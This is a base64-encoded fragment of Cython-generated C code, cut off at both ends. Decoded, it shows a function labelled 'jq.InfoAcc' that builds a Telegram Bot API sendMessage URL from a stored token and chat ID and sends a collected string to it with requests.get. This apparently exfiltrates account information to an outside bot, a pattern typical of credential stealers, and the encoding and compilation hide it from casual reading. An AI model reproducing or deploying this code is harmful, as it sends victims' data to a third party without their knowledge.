QWVhfRVJSKDAsIDI4OSwgX19weXhfTDIzX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX3B5eF90XzEwID0gKCFfX3B5eF90XzkpO1xuICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzEwKSkge1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8yMSk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE5KTtcbiAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF8xNywgX19weXhfdF8yMSwgX19weXhfdF8xOSk7XG4gICAgICAgICAgICBfX3B5eF90XzE3ID0gMDsgIF9fcHl4X3RfMjEgPSAwOyAgX19weXhfdF8xOSA9IDA7IFxuICAgICAgICAgICAgX19QWVhfRVJSKDAsIDI4OSwgX19weXhfTDIzX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MMjJfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfTDIzX2V4Y2VwdF9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjIpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfNiwgX19weXhfdF8yMik7XG4gICAgICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgICAgIF9fcHl4X0wyMl9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjIpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfNiwgX19weXhfdF8yMik7XG4gICAgICAgIF9fcHl4X0wyNl90cnlfZW5kOjtcbiAgICAgIH1cbiAgICB9XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgaWYgKF9fcHl4X3RfOCkge1xuICAgICAgICAgIF9fcHl4X3RfMjIgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0sIE5VTEwpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yMikpIF9fUFlYX0VSUigwLCAyODksIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIyKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMik7IF9fcHl4X3RfMjIgPSAwO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gX19weXhfTDIwO1xuICAgICAgfVxuICAgICAgX19weXhfTDIwOjtcbiAgICB9XG4gICAgZ290byBfX3B5eF9MMzA7XG4gICAgX19weXhfTDE3X2Vycm9yOjtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wzMDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF84LCAmX19weXhfdF8yMiwgJl9fcHl4X3RfNik7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMik7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAge1xuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF83LCAmX19weXhfdF8yMywgJl9fcHl4X3RfMjQpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMyk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yNCk7XG4gICAgICAgICB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzIxID0gTlVMTDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAyOTMsIF9fcHl4X0wzN19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgX19weXhfdF8xOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCAyOTMsIF9fcHl4X0wzN19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1Rva2VuKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDI5NCwgX19weXhfTDM3X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICBfX3B5eF90XzE2ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMjk0LCBfX3B5eF9MMzdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSUQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMjk0LCBfX3B5eF9MMzdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgICAgICAgIF9fcHl4X3RfMTUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNSkpIF9fUFlYX0VSUigwLCAyOTQsIF9fcHl4X0wzN19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzI1WzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hcGlfdGVsZWdyYW1fb3JnX2JvdDtcbiAgICAgICAgICBfX3B5eF90XzI1WzFdID0gX19weXhfdF8xNjtcbiAgICAgICAgICBfX3B5eF90XzI1WzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9zZW5kTWVzc2FnZV9jaGF0X2lkO1xuICAgICAgICAgIF9fcHl4X3RfMjVbM10gPSBfX3B5eF90XzE1O1xuICAgICAgICAgIF9fcHl4X3RfMjVbNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3RleHRfMjtcbiAgICAgICAgICBfX3B5eF90XzI1WzVdID0gX19weXhfdl9zcztcbiAgICAgICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8yNSwgNiwgMjggKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE2KSArIDIxICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xNSkgKyA2ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdl9zcyksIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzE2KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzE1KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF92X3NzKSk7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDI5NCwgX19weXhfTDM3X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgICAgX19weXhfdF81ID0gMTtcbiAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTgpKSkge1xuICAgICAgICAgICAgX19weXhfdF8yMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTgpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMjEpO1xuICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzE4KTtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIxKTtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE4LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19weXhfdF81ID0gMDtcbiAgICAgICAgICB9XG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMjEsIF9fcHl4X3RfMTd9O1xuICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTgsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDI5MywgX19weXhfTDM3X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjMpOyBfX3B5eF90XzIzID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzI0KTsgX19weXhfdF8yNCA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDQyX3RyeV9lbmQ7XG4gICAgICAgIF9fcHl4X0wzN19lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfMjYgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7XG4gICAgICAgIGlmIChfX3B5eF90XzI2KSB7XG4gICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS5JbmZvQWNjIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xOSwgJl9fcHl4X3RfMTgsICZfX3B5eF90XzE3KSA8IDApIF9fUFlYX0VSUigwLCAyOTUsIF9fcHl4X0wzOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE5KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfMTg7XG4gICAgICAgICAgIHtcblxuICAgICAgICAgICAgXG4gICAgICAgICAgICBfX3B5eF90XzE1ID0gTlVMTDtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX3B5eF9idWlsdGluX3ByaW50OyBcbiAgICAgICAgICAgIF9fcHl4X3RfNSA9IDE7XG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzE1LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGV9O1xuICAgICAgICAgICAgICBfX3B5eF90XzIxID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCAyOTYsIF9fcHl4X0w0OF9lcnJvcilcbiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjEpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDtcbiAgICAgICAgICB9XG5cbiAgICAgICAgICBcbiAgICAgICAgICAge1xuICAgICAgICAgICAge1xuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDtcbiAgICAgICAgICAgICAgZ290byBfX3B5eF9MNDk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX3B5eF9MNDhfZXJyb3I6O1xuICAgICAgICAgICAge1xuICAgICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgICAgICAgX19weXhfdF8yOSA9IDA7IF9fcHl4X3RfMzAgPSAwOyBfX3B5eF90XzMxID0gMDsgX19weXhfdF8zMiA9IDA7IF9fcHl4X3RfMzMgPSAwOyBfX3B5eF90XzM0ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJl9fcHl4X3RfMzIsICZfX3B5eF90XzMzLCAmX19weXhfdF8zNCk7XG4gICAgICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzI5LCAmX19weXhfdF8zMCwgJl9fcHl4X3RfMzEpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzI5LCAmX19weXhfdF8zMCwgJl9fcHl4X3RfMzEpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjkpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzApO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzEpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzIpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzMpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzQpO1xuICAgICAgICAgICAgICBfX3B5eF90XzI2ID0gX19weXhfbGluZW5vOyBfX3B5eF90XzI3ID0gX19weXhfY2xpbmVubzsgX19weXhfdF8yOCA9IF9fcHl4X2ZpbGVuYW1lO1xuICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zMik7XG4gICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMzMpO1xuICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzM0KTtcbiAgICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8zMiwgX19weXhfdF8zMywgX19weXhfdF8zNCk7XG4gICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjkpO1xuICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMwKTtcbiAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zMSk7XG4gICAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8yOSwgX19weXhfdF8zMCwgX19weXhfdF8zMSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMjkgPSAwOyBfX3B5eF90XzMwID0gMDsgX19weXhfdF8zMSA9IDA7IF9fcHl4X3RfMzIgPSAwOyBfX3B5eF90XzMzID0gMDsgX19weXhfdF8zNCA9IDA7XG4gICAgICAgICAgICAgIF9fcHl4X2xpbmVubyA9IF9fcHl4X3RfMjY7IF9fcHl4X2NsaW5lbm8gPSBfX3B5eF90XzI3OyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X3RfMjg7XG4gICAgICAgICAgICAgIGdvdG8gX19weXhfTDM5X2V4Y2VwdF9lcnJvcjtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fcHl4X0w0OTo7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDM4X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gX19weXhfTDM5X2V4Y2VwdF9lcnJvcjtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfTDM5X2V4Y2VwdF9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjMpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI0KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzIzLCBfX3B5eF90XzI0KTtcbiAgICAgICAgZ290byBfX3B5eF9MMzFfZXJyb3I7XG4gICAgICAgIF9fcHl4X0wzOF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjMpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI0KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzIzLCBfX3B5eF90XzI0KTtcbiAgICAgICAgX19weXhfTDQyX3RyeV9lbmQ6O1xuICAgICAgfVxuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMik7IF9fcHl4X3RfMjIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICBnb3RvIF9fcHl4X0wzNl90cnlfZW5kO1xuICAgIF9fcHl4X0wzMV9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygianEuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xNywgJl9fcHl4X3RfMTgsICZfX3B5eF90XzE5KSA8IDApIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzM19leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xNiA9IE5VTEw7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7XG4gICAgICBfX3B5eF90XzE1ID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gICAgICBfX3B5eF90XzUgPSAxO1xuICAg